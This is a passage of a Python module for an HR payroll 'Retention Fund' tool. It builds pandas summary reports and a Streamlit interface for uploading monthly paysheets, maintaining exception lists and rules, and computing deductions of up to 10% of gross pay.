            "Company Code": ("Company Code", "last"),
            "Retention Applicable": ("Retention Applicable", "last"),
            "Months Processed": ("Paysheet Month", "nunique"),
            "Months With Deduction": ("Deduction Amount", lambda s: int((s > 0).sum())),
            "Total Deduction Accumulated": ("Deduction Amount", "sum"),
            "Latest Status": ("Status", "last"),
        }
    ).reset_index()

    first_deduction = (
        combined.loc[combined["Deduction Amount"] > 0]
        .groupby(erp_col)["Paysheet Month"]
        .min()
        .rename("First Deduction Month")
    )
    summary = summary.merge(first_deduction, on=erp_col, how="left")
    return summary.sort_values(erp_col).reset_index(drop=True), combined


def _group_report(combined: pd.DataFrame, group_col: str) -> pd.DataFrame:
    if combined.empty or group_col not in combined.columns:
        return pd.DataFrame()
    work = combined.copy()
    work[group_col] = work[group_col].fillna("").astype(str).str.strip().replace("", "Unmapped")
    return (
        work.groupby(group_col, dropna=False)
        .agg(
            Employees=("ERP", "nunique"),
            Paysheet_Rows=("ERP", "size"),
            Deduction_Rows=("Deduction Amount", lambda s: int((s > 0).sum())),
            Total_Retention_Fund=("Deduction Amount", "sum"),
        )
        .reset_index()
        .sort_values("Total_Retention_Fund", ascending=False)
        .reset_index(drop=True)
    )


def build_retention_reports(summary: pd.DataFrame, combined: pd.DataFrame) -> dict:
    """Build all reports required after the new First Hire Date logic."""
    if combined is None or combined.empty:
        return {
            "ERP Summary": pd.DataFrame(),
            "Month Wise Detail": pd.DataFrame(),
            "Monthly Summary": pd.DataFrame(),
            "Branch Summary": pd.DataFrame(),
            "Designation Summary": pd.DataFrame(),
            "Company Summary": pd.DataFrame(),
            "Employment Type Summary": pd.DataFrame(),
            "Status Summary": pd.DataFrame(),
            "Exceptions / No Deduction": pd.DataFrame(),
            "Missing Mapping": pd.DataFrame(),
            "First Hire Date Audit": pd.DataFrame(),
        }

    work = combined.copy()
    work["Paysheet Month"] = pd.to_datetime(work["Paysheet Month"])
    monthly = (
        work.groupby("Paysheet Month")
        .agg(
            Employees=("ERP", "nunique"),
            Deduction_Employees=("Deduction Amount", lambda s: int((s > 0).sum())),
            Total_Retention_Fund=("Deduction Amount", "sum"),
            Exceptional_ERP_Rows=("Exceptional ERP", "sum"),
            Missing_Mapping_Rows=("Employee Master Mapping Missing", "sum"),
        )
        .reset_index()
        .sort_values("Paysheet Month")
    )

    status = (
        work.groupby("Status", dropna=False)
        .agg(Rows=("ERP", "size"), Employees=("ERP", "nunique"), Total_Retention_Fund=("Deduction Amount", "sum"))
        .reset_index()
        .sort_values(["Rows", "Status"], ascending=[False, True])
    )

    exceptions = work.loc[work["Status"] != "Pending Release"].copy()
    missing_mapping = work.loc[
        work["Status"].isin(["Employee Master Mapping Missing", "Customize Rule Missing"])
    ].copy()
    first_hire_audit = work.loc[
        work.get("First Hire Date Variance", False) | work.get("First Hire Date Recovered", False)
    ].copy()

    return {
        "ERP Summary": summary.copy(),
        "Month Wise Detail": work,
        "Monthly Summary": monthly,
        "Branch Summary": _group_report(work, "Branch"),
        "Designation Summary": _group_report(work, "Designation"),
        "Company Summary": _group_report(work, "Company Code"),
        "Employment Type Summary": _group_report(work, "Employment Type"),
        "Status Summary": status,
        "Exceptions / No Deduction": exceptions,
        "Missing Mapping": missing_mapping,
        "First Hire Date Audit": first_hire_audit,
    }


def infer_paysheet_month_from_filename(filename: str):
    """Best-effort month detection used by the multi-file Streamlit section."""
    name = os.path.splitext(os.path.basename(filename or ""))[0]

    # 2026-09 / 2026_09 / 202609
    m = re.search(r"(?<!\d)(20\d{2})[-_ ]?(0?[1-9]|1[0-2])(?!\d)", name)
    if m:
        return pd.Timestamp(year=int(m.group(1)), month=int(m.group(2)), day=1)

    month_map = {
        "jan": 1, "january": 1, "feb": 2, "february": 2, "mar": 3, "march": 3,
        "apr": 4, "april": 4, "may": 5, "jun": 6, "june": 6, "jul": 7, "july": 7,
        "aug": 8, "august": 8, "sep": 9, "sept": 9, "september": 9, "oct": 10,
        "october": 10, "nov": 11, "november": 11, "dec": 12, "december": 12,
    }
    lower = name.lower()
    year_match = re.search(r"(?<!\d)(20\d{2})(?!\d)", lower)
    if year_match:
        for token, month_no in month_map.items():
            if re.search(rf"\b{re.escape(token)}\b", lower):
                return pd.Timestamp(year=int(year_match.group(1)), month=month_no, day=1)
    return None


# --------------------------------------------------------------------------
# Optional Streamlit UI renderer for pages/2_Retention_Fund.py
# --------------------------------------------------------------------------

def render_retention_fund_workspace():
    """Render Customize Dashboard, Exceptional ERP, Compute and Reports.

    A Retention Fund page can call this function after its normal login/nav
    checks. The 4-column paysheet format is kept exactly as requested; the
    existing Employee Database in session_state is used to auto-map ERP to
    Branch / Designation / Company Code.
    """
    st.header("💰 Retention Fund")
    st.caption(
        "First Hire Date based calculation • No internal-transfer logic • "
        "Deduction = min(10% of Monthly Gross, Net Pay)"
    )

    tab_customize, tab_exceptions, tab_compute, tab_reports = st.tabs(
        ["Customize Dashboard", "Exceptional ERP", "Consolidated Compute", "Reports"]
    )

    with tab_customize:
        st.subheader("Customize Dashboard")
        st.write(
            "Bulk upload only **Branch, Company Code and Designation**. "
            "Employment Type and Retention Applicable are maintained using dropdowns."
        )
        st.download_button(
            "⬇️ Download Customize Sample",
            data=to_excel_bytes({"Customize Sample": sample_customize_dashboard_bulk_template()}),
            file_name="customize_dashboard_sample.xlsx",
            mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        )

        upload = st.file_uploader(
            "Upload Customize rules (.xlsx/.csv)",
            type=["xlsx", "xls", "csv"],
            key="retention_customize_upload",
        )
        rules = load_customize_dashboard()
        if upload is not None:
            try:
                uploaded_df = read_any_table(upload)
                rules = merge_customize_dashboard_bulk_upload(
                    rules,
                    uploaded_df,
                    branch_col="Branch",
                    cc_col="Company Code",
                    designation_col="Designation",
                )
                st.success(f"Loaded {len(rules):,} customize rule(s). Review dropdowns and save.")
            except Exception as exc:
                st.error(safe_error_message(exc, "reading the Customize Dashboard upload"))

        edited_rules = st.data_editor(
            rules,
            use_container_width=True,
            hide_index=True,
            num_rows="dynamic",
            column_config={
                "Employment Type": st.column_config.SelectboxColumn(
                    "Employment Type", options=EMPLOYMENT_TYPE_OPTIONS, required=True
                ),
                "Retention Applicable": st.column_config.SelectboxColumn(
                    "Retention Applicable", options=RETENTION_APPLICABLE_OPTIONS, required=True
                ),
            },
            key="retention_customize_editor",
        )
        if st.button("💾 Save Customize Dashboard", key="save_customize_dashboard"):
            save_customize_dashboard(edited_rules)
            st.success("Customize Dashboard saved.")

    with tab_exceptions:
        st.subheader("Exceptional ERP Cases")
        st.write("ERPs saved here will never have Retention Fund deducted, regardless of any other rule.")
        current_erps = load_exceptional_erps()
        erp_text = st.text_area(
            "ERP list (one ERP per line)",
            value="\n".join(current_erps),
            height=220,
            key="exceptional_erp_text",
        )
        if st.button("💾 Save Exceptional ERPs", key="save_exceptional_erps"):
            values = [line.strip() for line in erp_text.splitlines() if line.strip()]
            save_exceptional_erps(values)
            st.success(f"Saved {len(set(v.upper() for v in values)):,} exceptional ERP(s).")

    with tab_compute:
        st.subheader("Consolidated Paysheet Compute")
        st.write(
            "Upload paysheets for different months. Each monthly file must contain only: "
            "**ERP, First Hire Date, Net Pay, Monthly Gross**."
        )
        st.download_button(
            "⬇️ Download Consolidated Paysheet Sample",
            data=to_excel_bytes({"Paysheet Sample": sample_consolidated_paysheet_template()}),
            file_name="consolidated_paysheet_sample.xlsx",
            mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        )

        files = st.file_uploader(
            "Upload monthly paysheets",
            type=["xlsx", "xls", "csv"],
            accept_multiple_files=True,
            key="consolidated_paysheet_uploads",
        )

        employee_master = st.session_state.get("employee_db")
        if employee_master is None or normalise_employee_master(employee_master).empty:
            st.warning(
                "Employee Database mapping is not available. The 4-column paysheet does not contain "
                "Branch / Designation / Company Code, so unmapped ERPs will be blocked from deduction."
            )

        monthly_inputs = []
        for i, uploaded in enumerate(files or []):
            try:
                data = read_any_table(uploaded)
                missing = [c for c in CONSOLIDATED_PAYSHEET_COLUMNS if c not in data.columns]
                if missing:
                    st.error(f"{uploaded.name}: missing {', '.join(missing)}")
                    continue

                inferred = infer_paysheet_month_from_filename(uploaded.name)
                default_month = inferred if inferred is not None else pd.Timestamp.today().to_period("M").to_timestamp()
                c1, c2 = st.columns([2, 1])
                with c1:
                    st.write(f"**{uploaded.name}** — {len(data):,} row(s)")
                with c2:
                    selected_date = st.date_input(
                        "Paysheet month",
                        value=default_month.date(),
                        key=f"paysheet_month_{i}_{uploaded.name}",
                    )
                monthly_inputs.append({"month": selected_date, "data": data, "source": uploaded.name})
            except Exception as exc:
                st.error(safe_error_message(exc, f"reading {uploaded.name}"))

        if st.button("🧮 Compute Retention Fund", type="primary", disabled=not monthly_inputs):
            try:
                summary, combined = process_consolidated_paysheets(
                    monthly_inputs,
                    exceptional_erps=load_exceptional_erps(),
                    customize_dashboard=load_customize_dashboard(),
                    employee_master=employee_master,
                    deduction_pct=10.0,
                )
                st.session_state["consolidated_paysheet_summary"] = summary
                st.session_state["consolidated_paysheet_result"] = combined
                st.success(
                    f"Processed {combined['Paysheet Month'].nunique():,} month(s), "
                    f"{combined['ERP'].nunique():,} ERP(s). Total Retention Fund: "
                    f"₹{combined['Deduction Amount'].sum():,.2f}"
                )
            except Exception as exc:
                st.error(safe_error_message(exc, "computing consolidated Retention Fund"))

        combined_now = st.session_state.get("consolidated_paysheet_result")
        if isinstance(combined_now, pd.DataFrame) and not combined_now.empty:
            preview_cols = [
                "ERP", "Paysheet Month", "First Hire Date", "Branch", "Designation",
                "Employment Type", "Company Code", "Retention Applicable", "Net Pay",
                "Monthly Gross", "10% of Gross", "Deduction Amount", "Status",
            ]
            st.dataframe(combined_now[[c for c in preview_cols if c in combined_now.columns]], use_container_width=True)

    with tab_reports:
        st.subheader("Retention Fund Reports")
        summary = st.session_state.get("consolidated_paysheet_summary")
        combined = st.session_state.get("consolidated_paysheet_result")
        if not isinstance(combined, pd.DataFrame) or combined.empty:
            st.info("Run Consolidated Compute first to generate reports.")
        else:
            reports = build_retention_reports(summary, combined)
            report_names = list(reports.keys())
            selected = st.selectbox("Report", report_names, key="retention_report_selector")
            st.dataframe(reports[selected], use_container_width=True)
            st.download_button(
                "⬇️ Download All Retention Reports",
                data=to_excel_bytes(reports),
                file_name="retention_fund_reports.xlsx",
                mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            )

    render_clear_data_button()
